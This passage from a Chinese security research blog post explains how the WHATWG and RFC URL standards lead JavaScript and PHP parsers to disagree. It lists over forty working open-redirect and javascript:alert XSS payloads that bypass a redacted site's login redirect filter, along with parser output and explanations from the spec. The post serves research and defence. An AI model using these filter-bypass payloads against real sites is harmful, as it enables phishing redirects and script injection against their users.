class="o">:</span> <span class="s2">&#34;&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kr">debugger</span> <span class="nb">eval</span> <span class="nx">code</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="mi">13</span>
+</span></span><span class="line"><span class="cl"><span class="nx">i</span><span class="o">:</span> <span class="mi">13</span> <span class="nx">URL</span> <span class="nx">encoded</span> <span class="nx">i</span> <span class="o">:</span> <span class="o">%</span><span class="mi">0</span><span class="nx">D</span> <span class="kr">debugger</span> <span class="nb">eval</span> <span class="nx">code</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="mi">13</span>
+</span></span><span class="line"><span class="cl"><span class="nx">URL</span> <span class="p">{</span> <span class="nx">href</span><span class="o">:</span> <span class="s2">&#34;http://localhost/xxxx&#34;</span><span class="p">,</span> <span class="nx">origin</span><span class="o">:</span> <span class="s2">&#34;http://localhost&#34;</span><span class="p">,</span> <span class="nx">protocol</span><span class="o">:</span> <span class="s2">&#34;http:&#34;</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">host</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="nx">hostname</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="nx">port</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">pathname</span><span class="o">:</span> <span class="s2">&#34;/xxxx&#34;</span><span class="p">,</span> <span class="nx">search</span><span class="o">:</span> <span class="s2">&#34;&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kr">debugger</span> <span class="nb">eval</span> <span class="nx">code</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="mi">13</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Array</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">[</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">13</span> <span class="p">]</span>
+</span></span></code></pre></div><p>得到了如下payload</p>
+<pre tabindex="0"><code>ht%0dtp://localhost
+ht%0atp://localhost
+ht%09tp://localhost
+java%09script:alert(1)
+java%0dscript:alert(1)
+java%0ascript:alert(1)
+</code></pre><p>那么PHP的URL解析器是如何处理这些畸形URL的呢?</p>
+<pre tabindex="0"><code>  [&#34;ht%0dtp://localhost&#34;]=&gt;
+  array(1) {
+    [&#34;path&#34;]=&gt;
+    string(19) &#34;ht%0dtp://localhost&#34;
+  }
+  [&#34;ht%0atp://localhost&#34;]=&gt;
+  array(1) {
+    [&#34;path&#34;]=&gt;
+    string(19) &#34;ht%0atp://localhost&#34;
+  }
+  [&#34;ht%09tp://localhost&#34;]=&gt;
+  array(1) {
+    [&#34;path&#34;]=&gt;
+    string(19) &#34;ht%09tp://localhost&#34;
+  }
+  [&#34;java%09script:alert(1)&#34;]=&gt;
+  array(1) {
+    [&#34;path&#34;]=&gt;
+    string(22) &#34;java%09script:alert(1)&#34;
+  }
+  [&#34;java%0dscript:alert(1)&#34;]=&gt;
+  array(1) {
+    [&#34;path&#34;]=&gt;
+    string(22) &#34;java%0dscript:alert(1)&#34;
+  }
+  [&#34;java%0ascript:alert(1)&#34;]=&gt;
+  array(1) {
+    [&#34;path&#34;]=&gt;
+    string(22) &#34;java%0ascript:alert(1)&#34;
+  }
+</code></pre><p>PHP 的URL解析器再一次地认为这些URL都是&rsquo;规范的&rsquo;相对URL，全部通过了redacted fitler的检查</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=ht%0dtp://baidu.com
+https://demo.redacted.com/login?goto=ht%0atp://baidu.com
+https://demo.redacted.com/login?goto=ht%09tp://baidu.com
+https://demo.redacted.com/login?goto=java%09script:alert(1)
+https://demo.redacted.com/login?goto=java%0dscript:alert(1)
+https://demo.redacted.com/login?goto=java%0ascript:alert(1)
+</code></pre><p>实际上这三种字符可以放在scheme的任意位置:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=java%0asc%0aript:alert(1)
+</code></pre>
+
+<h3 class="relative group">汇总 
+    <div id="%E6%B1%87%E6%80%BB" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E6%B1%87%E6%80%BB" aria-label="锚点">#</a>
+    </span>        
+    
+</h3>
+<p>通过对javascript URL parser 与php URL parser不一致性的进一步研究，我一共找到了四十几种绕过redacted filter 的方法：</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=http://baidu.com\@demo.redacted.com/
+https://demo.redacted.com/login?goto=javascript:///%250dalert(1)
+https://demo.redacted.com/login?goto=http:///www.baidu.com
+https://demo.redacted.com/login?goto=http:\//www.baidu.com
+https://demo.redacted.com/login?goto=http:%0d\\www.baidu.com
+https://demo.redacted.com/login?goto=http:%0a\\www.baidu.com
+https://demo.redacted.com/login?goto=http:%09\\www.baidu.com
+https://demo.redacted.com/login?goto=javascript%0d:alert(1) 
+https://demo.redacted.com/login?goto=javascript%0a:alert(1) 
+https://demo.redacted.com/login?goto=javascript%09:alert(1) 
+https://demo.redacted.com/login?goto=http%09://baidu.com 
+https://demo.redacted.com/login?goto=%00javascript:alert(1)
+https://demo.redacted.com/login?goto=%01javascript:alert(1)
+https://demo.redacted.com/login?goto=%02javascript:alert(1)
+https://demo.redacted.com/login?goto=%03javascript:alert(1)
+https://demo.redacted.com/login?goto=%04javascript:alert(1)
+https://demo.redacted.com/login?goto=%05javascript:alert(1)
+https://demo.redacted.com/login?goto=%06javascript:alert(1)
+https://demo.redacted.com/login?goto=%07javascript:alert(1)
+https://demo.redacted.com/login?goto=%08javascript:alert(1)
+https://demo.redacted.com/login?goto=%09javascript:alert(1)
+https://demo.redacted.com/login?goto=%0Ajavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Bjavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Cjavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Djavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Ejavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Fjavascript:alert(1)
+https://demo.redacted.com/login?goto=%10javascript:alert(1)
+https://demo.redacted.com/login?goto=%11javascript:alert(1)
+https://demo.redacted.com/login?goto=%12javascript:alert(1)
+https://demo.redacted.com/login?goto=%13javascript:alert(1)
+https://demo.redacted.com/login?goto=%14javascript:alert(1)
+https://demo.redacted.com/login?goto=%15javascript:alert(1)
+https://demo.redacted.com/login?goto=%16javascript:alert(1)
+https://demo.redacted.com/login?goto=%17javascript:alert(1)
+https://demo.redacted.com/login?goto=%18javascript:alert(1)
+https://demo.redacted.com/login?goto=%19javascript:alert(1)
+https://demo.redacted.com/login?goto=%1Ajavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Bjavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Cjavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Djavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Ejavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Fjavascript:alert(1)
+https://demo.redacted.com/login?goto=%20javascript:alert(1)
+https://demo.redacted.com/login?goto=ht%0dtp://baidu.com
+https://demo.redacted.com/login?goto=ht%0atp://baidu.com
+https://demo.redacted.com/login?goto=ht%09tp://baidu.com
+https://demo.redacted.com/login?goto=java%09script:alert(1)
+https://demo.redacted.com/login?goto=java%0dscript:alert(1)
+https://demo.redacted.com/login?goto=java%0ascript:alert(1)
+https://demo.redacted.com/login?goto=java%0asc%0aript:alert(1)
+</code></pre>
+
+<h2 class="relative group">根本原因 
+    <div id="%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>为什么javascript URL parser与PHP URL parser之间存在这么大的不一致性?</p>
+<p>因为这个世界上存在两种URL解析标准：RFC标准和WHATWG标准，WHATWG 组织在<code>参考</code>RFC标准的基础上，自己制定了一套标准:<a href="https://url.spec.whatwg.org/#url-parsing" target="_blank"> URL parsing </a></p>
+<p>浏览器端javascript URL parser遵循了WHATWG标准，而PHP URL parser 遵循了RFC规范, Node.js 则同时提供了两种URL解析器，分别是 <code>url.parse</code> 和 <code>new URL</code> ，前者遵循RFC标准，后者遵循WHATWG标准。</p>
+<p>WHATWG URL parsing 标准中是这么说的:</p>
+<blockquote>
+<ol>
+<li>If input contains any leading or trailing C0 control or space, validation error.</li>
+<li>Remove any leading and trailing C0 control or space from input.</li>
+</ol>
+</blockquote>
+<p>如果说输入的URL开头和结尾有C0 控制符和space，则报一个 validtion error,然后删除输入中给所有开头和结尾的 C0 控制符 和 space ，其中 C0 control 的范围是: 0x00-0x1F ,space 的范围是 0x20 ，所以C0 control + space的范围是 0x00-0x20</p>
+<p>什么叫 <a href="https://url.spec.whatwg.org/#validation-error" target="_blank">validation error</a> ，标准是这么说:</p>
+<blockquote>
+<p>A validation error indicates a mismatch between input and valid input. User agents, especially conformance checkers, are encouraged to report them somewhere.A validation error does not mean that the parser terminates. Termination of a parser is always stated explicitly, e.g., through a return statement.</p>
+</blockquote>
+<p>validtion error 只是表示输入和有效输入之间的不匹配，并不意味着解析终止，标准<strong>鼓励</strong>实现者在某处报告它。</p>
+<p>这就是为什么以下这些payload可以工作:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=%00javascript:alert(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=%01javascript:alert(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=%02javascript:alert(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=%20javascript:alert(1)
+</span></span></span></code></pre></div><p>然后这套标准又这么说:</p>
+<blockquote>
+<ol>
+<li>If input contains any ASCII tab or newline, validation error.</li>
+<li>Remove all ASCII tab or newline from input.</li>
+</ol>
+</blockquote>
+<p>那么<a href="https://infra.spec.whatwg.org/#ascii-tab-or-newline" target="_blank">ASCII tab or newline</a> 范围有多大?</p>
+<blockquote>
+<p>An ASCII tab or newline is U+0009 TAB, U+000A LF, or U+000D CR.</p>
+</blockquote>
+<p>所以下面这些payload中%0d %0a %09都会被javascript URL parser给删除掉</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=ht%0dtp://baidu.com
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=ht%0atp://baidu.com
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=ht%09tp://baidu.com
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=java%09script:alert(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=java%0dscript:alert(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=java%0ascript:alert(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=java%0asc%0aript:alert(1)
+</span></span></span></code></pre></div><p>换句话说，%0d %0a %09 这三个字符可以放在URL的任何位置来对URL进行混淆，反正javascript URL parser 会删除掉这些字符,比如</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;http:/\x09/baidu.com&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">URL</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">origin</span><span class="o">:</span> <span class="s1">&#39;http://baidu.com&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">protocol</span><span class="o">:</span> <span class="s1">&#39;http:&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">host</span><span class="o">:</span> <span class="s1">&#39;baidu.com&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div>
+
+<h2 class="relative group">总结 
+    <div id="%E6%80%BB%E7%BB%93" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E6%80%BB%E7%BB%93" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>世界上最糟糕的事莫过于对于同一事物有两套标准，如果标准存在不一致性，那么实现必然存在不一致性。不一致性导致的安全问题是隐蔽的，因为当你审计单个系统的时候，你会认为没有安全问题，但是当你把多个系统连接起来协同工作的时候，安全问题就会出现。这也说明了审计安全问题，需要从全局出发来统筹考虑，不能只是审计单个系统。</p>
+<p>同时值得注意的是,凡是标准和规范没有明确规定或者模棱两可的地方，实现标准的开发者之间就会存在理解偏差，进而导致各种遵循标准实现的语言、库、框架、软件之间出现不一致性，这种不一致性便是创造新的攻击技术的沃土。</p>
+<pre tabindex="0"><code>+----------------------------------------------------+
+| 存在两套标准/标准的模棱两可/标准没有明确规定/标准的不同版本 |
++----------------------------------------------------+
+                        |
+                        v
+              +-------------------+
+              |  实现的不一致性     |
+              +-------------------+
+                        |
+                        v
+      +------------------------------------+
+      |  各种bypass trick/新的攻击技术       |
+      +------------------------------------+
+</code></pre>
+
+<h2 class="relative group">Keep in touch 
+    <div id="keep-in-touch" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#keep-in-touch" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<p>如果你有好的想法或者其他疑问，可以发送邮件给我:</p>
+<ul>
+<li>Email: <a href="mailto:hdrw1024@gmail.com">hdrw1024@gmail.com</a></li>
+<li>Twitter: <a href="https://twitter.com/RuiShang9" target="_blank">https://twitter.com/RuiShang9</a></li>
+<li>Medium: <a href="https://medium.com/@hdrw1024" target="_blank">https://medium.com/@hdrw1024</a></li>
+<li>Blog: <a href="https://shangrui-hash.github.io/en/" target="_blank">https://shangrui-hash.github.io/en/</a></li>
+<li>Github: <a href="https://github.com/ShangRui-hash" target="_blank">https://github.com/ShangRui-hash</a></li>
+<li>微信公众号:
+
+    <figure>
+      <img class="my-0 rounded-md" loading="lazy" src="/qrcode1.jpg" alt="" />
+      
+    </figure>
+</li>
+</ul>
+
+
+<h2 class="relative group">参考资料 
+    <div id="%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99" aria-label="锚点">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li><a href="https://infra.spec.whatwg.org/#c0-control-or-space" target="_blank">whatwg - C0 control 标准</a></li>
+<li><a href="https://url.spec.whatwg.org/#url-parsing" target="_blank">whatwg - URL parsing 标准</a></li>
+<li><a href="https://url.spec.whatwg.org/#validation-error" target="_blank">whatwg - validation error</a></li>
+<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!</a></li>
+<li><a href="https://claroty.com/wp-content/uploads/2022/01/Exploiting-URL-Parsing-Confusion.pdf" target="_blank">EXPLOITING URL PARSERS: THE GOOD, BAD, AND INCONSISTENT</a></li>
+<li><a href="https://www.youtube.com/watch?v=0uejy9aCNbI&amp;list=RDCMUClcE-kVhqyiHCcjYwcpfj9w&amp;index=3" target="_blank">HOW FRCKN&rsquo; HARD IS IT TO UNDERSTAND A URL?! - uXSS CVE-2018-6128</a></li>
+<li><a href="https://www.youtube.com/watch?v=gVrdE6g_fa8&amp;t=239s" target="_blank">How did Masato find the Google Search XSS?</a></li>
+<li><a href="https://www.youtube.com/watch?v=yq_P3dzGiK4&amp;t=2s" target="_blank">Fuzzing Browsers for weird XSS Vectors</a></li>
+<li><a href="https://daniel.haxx.se/blog/2017/01/30/one-url-standard-please/" target="_blank">2017/Daniel Stenberg/ONE URL STANDARD PLEASE</a></li>
+<li><a href="https://daniel.haxx.se/blog/2022/01/10/dont-mix-url-parsers/" target="_blank">2022/Daniel Stenberg/DON’T MIX URL PARSERS</a></li>
+</ul>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+        
+
+          
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_posts\/a_research_of_inconsistencies_in_front_and_backend_URL_parsers.en.md"
+        var oid_likes = "likes_posts\/a_research_of_inconsistencies_in_front_and_backend_URL_parsers.en.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.b06a29d42a4ed16787978e2eee1e8c797b7698db2bc14ccee78f5c80ac566fc996190a73ad80a5e987558474b20b96fa38f7d85b405f165ff72b7b163c5ad11b.js" integrity="sha512-sGop1CpO0WeHl44u7h6MeXt2mNsrwUzO549cgKxWb8mWGQpzrYCl6YdVhHSyC5b6OPfYW0BfFl/3K3sWPFrRGw=="></script>
+      
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/xss-via-server-side-mime-sniff/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Go语言项目容器化导致的Server-Side MIME Sniff</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-03-02T01:49:29&#43;08:00">2 March 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="返回顶部" title="返回顶部">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2025
+      无在无不在
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      由 <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a> 强力驱动
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.62060bb247f4de2b6dde45903668fefb68d792f365587605177b1227c0cf43588701edaca0cb40e2c8e2789bd5ce67c1d2a215b9fb258c3496a7cd25e7cb5fdf.js" integrity="sha512-YgYLskf03itt3kWQNmj&#43;&#43;2jXkvNlWHYFF3sSJ8DPQ1iHAe2soMtA4sjieJvVzmfB0qIVufsljDSWp80l58tf3w=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://shangrui-hash.github.io/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="搜索"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="关闭 (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
